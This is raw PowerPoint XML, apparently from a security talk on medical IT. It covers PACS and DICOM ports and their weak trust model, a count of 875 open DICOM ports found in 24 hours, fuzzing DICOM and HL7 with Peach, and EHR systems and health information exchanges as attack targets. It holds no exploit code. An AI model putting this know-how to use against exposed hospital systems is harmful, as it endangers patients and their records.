              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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800" cap="all" dirty="0" err="1" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Pacs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8800" cap="all" dirty="0" err="1" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>dicom</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8800" cap="all" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5134880"/>
            <a:ext cx="9144000" cy="886408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr"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3188948868"/>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pacs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Picture Archiving and Communication Systems (PACS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>centralized archival and retrieval of medical images</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>x-rays, CTs, MRIs, etc…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Digital Imaging and Communications in Medicine (DICOM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>the standard format for medical image storage and transfer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>DICOM the network protocol</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>DICOM the file format</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>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dicom</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network</a:t>
            </a:r>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protocol</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>TCP/UDP 104 and 11112</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Authed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>/encrypted on 2761 (ISCL - DES-CBC) and 2762 (TLS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Typically found in clear text</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Service Class User = Client; Service Class Provider = Server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Connect with IP, port, and Application Entity (AE) title.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>SCU AE title may need to be trusted by SCP to connect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>IP address very often needs to be trusted by SCP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>DIMSE Services – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Dicom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Message Service Element</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Not unlike FTP in many ways.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>C-STORE, C-GET, C-MOVE, C-FIND, C-ECHO, N-EVENT-REPORT, N-GET, N-SET, N-ACTION, N-CREATE, N-DELETE</a:t>
            </a:r>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smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>24</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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hrs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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875</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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ports</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Content Placeholder 4" descr="open-dicom-ports.PNG"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2086894" y="1412875"/>
            <a:ext cx="4970213" cy="4392613"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>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typical</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de</a:t>
            </a:r>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explicit</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vr</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Content Placeholder 3" descr="typical_de_explicitvr.PNG"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="468313" y="2503345"/>
            <a:ext cx="8207375" cy="2211672"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>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de</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from</a:t>
            </a:r>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hell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Content Placeholder 4" descr="devilde.PNG"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="634516" y="1412875"/>
            <a:ext cx="7874969" cy="4392613"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>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dicom</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file</a:t>
            </a:r>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format</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Embedded metadata similar to JPEG.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Pixel data encoded in , RLE, JPEG, JPEG-LS, JPEG2000.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Data elements – Data Element Tag, Value Representations, Value Length, Value Field</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Semi-optional VR fields to describe data and format, e.g. PN = Person Name, AS = Age String, etc…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Data elements can be required, conditional, optional, fixed length, undefined length (with delimited sequences), nested, big </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>endian</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>, little </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>endian</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>, retired, private, and a myriad of other confusing options. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>More than one type of required, conditional, and optional</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>1,000+ registered VRs, many more unregistered</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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fuzzing</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medical</a:t>
            </a:r>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protocols</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>We wrote pits for the Peach </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Fuzzing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Props to Michael </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Eddington</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Done for 2 Protocols DICOM and HL7</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>HL7 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>DICOM </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>More protocols and versions as we write them</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>We are taking suggestions and volunteers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>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4365104"/>
            <a:ext cx="9144000" cy="2492896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>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8" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472008" y="1124744"/>
            <a:ext cx="7772400" cy="1512168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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0" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Sharing is caring</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8000" cap="all" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="2276872"/>
            <a:ext cx="7772400" cy="936104"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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5400" b="1" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Your records get around</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5400" cap="all" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5134880"/>
            <a:ext cx="9144000" cy="886408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr"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0" name="Subtitle 9"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3188948868"/>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Autofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3700" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Electronic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3700" cap="all" dirty="0"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(health/medical)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3700" cap="all" dirty="0" err="1" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>record</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="37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systems</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>EHR/EMRs are a central repository for both inputting, viewing, and storing electronic health information that originates from a variety of health information and billing systems. Interfaces include:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Billing Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>PACS Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Practice Management Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Prescription Drug Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Vital Monitoring Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Business Partner Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Etc…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>… Obviously this is a juicy target…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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Health</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information</a:t>
            </a:r>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exchanges</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Required by Health IT for Economic and Clinical Health Act (HITECH) as a part of the American Recovery and Reinvestment Act (ARRA) in order to meet Meaningful Use as defined by that legislation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Failure to integrate with a HIE will result in financial penalties to the health care organization. Deadline: October 2015.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>HIE’s are corporations that provide services related to data exchange and sharing of patient data between healthcare providers or differing groups in the same provider who are not otherwise related to each other. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Local, state, regional, and national level organizations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Data entered in one compromised organization now has the capability of propagating to other unrelated organizations.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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Personal</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health</a:t>
            </a:r>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records</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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phr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
